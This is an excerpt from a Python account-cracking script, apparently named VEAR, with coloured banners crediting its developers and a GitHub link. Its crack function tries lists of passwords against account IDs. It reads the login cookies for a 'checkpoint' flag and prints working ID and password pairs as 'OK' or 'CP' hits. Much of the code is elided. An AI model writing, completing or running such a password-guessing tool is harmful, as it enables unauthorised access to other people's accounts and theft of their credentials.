...
#GITHUB : https://github.com/vearahmad/vear7.git
#--------------------------------------------------------------------------#
#
#-----------------[ IMPORT-MODULE ]-------------------
...
\x1b[38;5;46m______________________________________________________
 ...
 \033[1;31m[\033[1;32m⊡\033[1;31m]\033[1;32m DEVELOPER : 🔥Kak_Killer🔥
 \033[1;31m[\033[1;32m⊡\033[1;31m]\033[1;32m DEVELOPER2: 🔥Kak_Yada🔥 
 \033[1;31m[\033[1;32m⊡\033[1;31m]\033[1;32m GITHUB    :   Yadasoran
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{bo} [VEAR] {h}{loop}|{len(id)} | {h}{ok} ")
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r \x1b[1;91m[VEAR-CP] {idf} | {pw}')     
				...
				#print ()
				print(f'\r\r\x1b[38;5;46m[VEAR-OK💉] '+idf+ ' | '+pw+'')
